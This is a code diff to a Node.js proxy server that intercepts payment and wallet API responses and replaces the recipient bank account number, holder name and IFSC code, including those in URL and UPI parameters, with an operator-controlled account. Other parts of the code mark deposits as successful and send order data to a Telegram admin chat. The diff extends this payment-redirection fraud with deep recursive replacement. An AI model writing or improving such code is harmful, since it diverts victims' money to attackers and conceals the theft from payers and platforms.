@@ -383,25 +383,8 @@ app.all('/wallet/online/walletType', async (req, res) => {
     }
 
     if (jsonResp && jsonResp.data) {
-      if (jsonResp.data.receiveAccountNo !== undefined) jsonResp.data.receiveAccountNo = active.accountNo;
-      if (jsonResp.data.receiveAccountName !== undefined) jsonResp.data.receiveAccountName = active.accountHolder;
-      if (jsonResp.data.receiveIfsc !== undefined) jsonResp.data.receiveIfsc = active.ifsc;
-      if (jsonResp.data.accountNo !== undefined) jsonResp.data.accountNo = active.accountNo;
-      if (jsonResp.data.accountName !== undefined) jsonResp.data.accountName = active.accountHolder;
-      if (jsonResp.data.ifsc !== undefined) jsonResp.data.ifsc = active.ifsc;
-
-      if (jsonResp.data.fallbackUrl && typeof jsonResp.data.fallbackUrl === 'string') {
-        let fUrl = jsonResp.data.fallbackUrl;
-        fUrl = fUrl.replace(/accountNo=[^&]*/gi, 'accountNo=' + encodeURIComponent(active.accountNo));
-        fUrl = fUrl.replace(/accountName=[^&]*/gi, 'accountName=' + encodeURIComponent(active.accountHolder));
-        fUrl = fUrl.replace(/account_no=[^&]*/gi, 'account_no=' + encodeURIComponent(active.accountNo));
-        fUrl = fUrl.replace(/account_name=[^&]*/gi, 'account_name=' + encodeURIComponent(active.accountHolder));
-        fUrl = fUrl.replace(/ifsc=[^&]*/gi, 'ifsc=' + encodeURIComponent(active.ifsc));
-        fUrl = fUrl.replace(/beneficiary_name=[^&]*/gi, 'beneficiary_name=' + encodeURIComponent(active.accountHolder));
-        fUrl = fUrl.replace(/account_number=[^&]*/gi, 'account_number=' + encodeURIComponent(active.accountNo));
-        fUrl = fUrl.replace(/ifsc_code=[^&]*/gi, 'ifsc_code=' + encodeURIComponent(active.ifsc));
-        jsonResp.data.fallbackUrl = fUrl;
-      }
+      const originalValues = {};
+      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
 
       if (jsonResp.code === undefined) jsonResp.code = 1;
     }
@@ -501,15 +484,13 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     let jsonResp;
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
 
+    if (bankData.adminChatId && bot && jsonResp && jsonResp.data) {
+      bot.sendMessage(bankData.adminChatId, `🔍 ORDER DEBUG ${req.path}:\n` + JSON.stringify(jsonResp.data, null, 2).substring(0, 3000)).catch(() => {});
+    }
+
     if (jsonResp && jsonResp.data && active) {
-      if (jsonResp.data.receiveAccountNo !== undefined) jsonResp.data.receiveAccountNo = active.accountNo;
-      if (jsonResp.data.receiveAccountName !== undefined) jsonResp.data.receiveAccountName = active.accountHolder;
-      if (jsonResp.data.receiveIfsc !== undefined) jsonResp.data.receiveIfsc = active.ifsc;
-      if (jsonResp.data.accountNo !== undefined) jsonResp.data.accountNo = active.accountNo;
-      if (jsonResp.data.accountName !== undefined) jsonResp.data.accountName = active.accountHolder;
-      if (jsonResp.data.accountHolder !== undefined) jsonResp.data.accountHolder = active.accountHolder;
-      if (jsonResp.data.ifsc !== undefined) jsonResp.data.ifsc = active.ifsc;
-      if (jsonResp.data.ifscCode !== undefined) jsonResp.data.ifscCode = active.ifsc;
+      const originalValues = {};
+      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
     }
 
     if (bankData.adminChatId && bot) {
@@ -639,24 +620,101 @@ async function proxyAndAddBonus(req, res) {
   }
 }
 
+const BANK_FIELD_MAP = {
+  receiveaccountno: 'accountNo',
+  receiveaccountname: 'accountHolder',
+  receiveifsc: 'ifsc',
+  accountno: 'accountNo',
+  accountname: 'accountHolder',
+  accountholder: 'accountHolder',
+  ifsc: 'ifsc',
+  ifsccode: 'ifsc',
+  bankaccountno: 'accountNo',
+  bankaccountname: 'accountHolder',
+  bankifsc: 'ifsc',
+  receivename: 'accountHolder',
+  receivebankname: 'accountHolder',
+  beneficiaryname: 'accountHolder',
+  beneficiaryaccount: 'accountNo',
+  payeename: 'accountHolder',
+  payeeaccount: 'accountNo',
+  payeeifsc: 'ifsc',
+  holdername: 'accountHolder',
+  holderaccount: 'accountNo'
+};
+
+function replaceBankInUrl(urlStr, active) {
+  if (!urlStr || typeof urlStr !== 'string') return urlStr;
+  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
+  const urlParamMap = {
+    'accountNo': active.accountNo, 'account_no': active.accountNo, 'accountno': active.accountNo,
+    'account_number': active.accountNo, 'accountNumber': active.accountNo, 'acc': active.accountNo,
+    'account': active.accountNo, 'receiveAccountNo': active.accountNo, 'receiver_account': active.accountNo,
+    'accountName': active.accountHolder, 'account_name': active.accountHolder, 'accountname': active.accountHolder,
+    'receiveAccountName': active.accountHolder, 'receiver_name': active.accountHolder, 'name': active.accountHolder,
+    'beneficiary_name': active.accountHolder, 'beneficiaryName': active.accountHolder, 'pn': active.accountHolder,
+    'pa': active.accountNo, 'holder_name': active.accountHolder,
+    'ifsc': active.ifsc, 'ifsc_code': active.ifsc, 'ifscCode': active.ifsc, 'receiveIfsc': active.ifsc,
+    'IFSC': active.ifsc
+  };
+  let result = urlStr;
+  for (const [param, val] of Object.entries(urlParamMap)) {
+    const regex = new RegExp('([?&])' + param.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=[^&]*', 'gi');
+    result = result.replace(regex, '$1' + param + '=' + encodeURIComponent(val));
+  }
+  return result;
+}
+
+function deepReplaceBankDetails(obj, active, originalValues, depth) {
+  if (!obj || !active || typeof obj !== 'object') return;
+  if (depth === undefined) depth = 0;
+  if (depth > 10) return;
+
+  for (const key of Object.keys(obj)) {
+    const lk = key.toLowerCase();
+    const mappedField = BANK_FIELD_MAP[lk];
+    if (mappedField && obj[key] !== undefined && obj[key] !== null) {
+      if (typeof obj[key] === 'string' || typeof obj[key] === 'number') {
+        if (originalValues && typeof obj[key] === 'string' && obj[key].length > 3) {
+          originalValues[key] = obj[key];
+        }
+        obj[key] = active[mappedField];
+      }
+    }
+
+    if (typeof obj[key] === 'string') {
+      const val = obj[key];
+      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
+        obj[key] = replaceBankInUrl(val, active);
+      }
+      if (originalValues) {
+        for (const [origKey, origVal] of Object.entries(originalValues)) {
+          if (typeof origVal === 'string' && origVal.length > 3 && val.includes(origVal)) {
+            const mappedF = BANK_FIELD_MAP[origKey.toLowerCase()];
+            if (mappedF) {
+              obj[key] = obj[key].split(origVal).join(active[mappedF]);
+            }
+          }
+        }
+      }
+    }
+
+    if (typeof obj[key] === 'object' && obj[key] !== null) {
+      if (Array.isArray(obj[key])) {
+        obj[key].forEach(item => {
+          if (typeof item === 'object' && item !== null) deepReplaceBankDetails(item, active, originalValues, depth + 1);
+        });
+      } else {
+        deepReplaceBankDetails(obj[key], active, originalValues, depth + 1);
+      }
+    }
+  }
+}
+
 function replaceBankInObject(obj, active) {
   if (!obj || !active) return;
-  const bankFields = {
-    receiveAccountNo: active.accountNo,
-    receiveAccountName: active.accountHolder,
-    receiveIfsc: active.ifsc,
-    accountNo: active.accountNo,
-    accountName: active.accountHolder,
-    accountHolder: active.accountHolder,
-    ifsc: active.ifsc,
-    ifscCode: active.ifsc,
-    bankAccountNo: active.accountNo,
-    bankAccountName: active.accountHolder,
-    bankIfsc: active.ifsc
-  };
-  for (const [key, val] of Object.entries(bankFields)) {
-    if (obj[key] !== undefined) obj[key] = val;
-  }
+  const originalValues = {};
+  deepReplaceBankDetails(obj, active, originalValues, 0);
 }
 
 async function proxyAndReplaceBankInList(req, res) {
@@ -701,7 +759,10 @@ async function proxyAndReplaceBankInList(req, res) {
 
     if (jsonResp && jsonResp.data) {
       const applyToItem = (item) => {
-        if (active) replaceBankInObject(item, active);
+        if (active) {
+          const origVals = {};
+          deepReplaceBankDetails(item, active, origVals, 0);
+        }
         if (bankData.depositSuccess) markDepositSuccess(item);
       };
       if (Array.isArray(jsonResp.data)) {
